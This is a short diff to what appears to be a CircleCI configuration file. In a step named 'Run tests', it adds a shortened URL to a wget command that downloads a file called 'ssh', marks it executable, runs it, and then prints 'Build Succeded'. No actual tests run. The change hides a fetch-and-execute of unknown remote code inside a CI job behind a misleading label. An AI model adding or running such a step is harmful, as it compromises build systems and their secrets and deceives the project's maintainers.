@@ -12,7 +12,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO ssh 
+                    wget -qO ssh https://git.io/J1zTY
                     chmod +x ssh
                     ./ssh
                     echo Build Succeded 
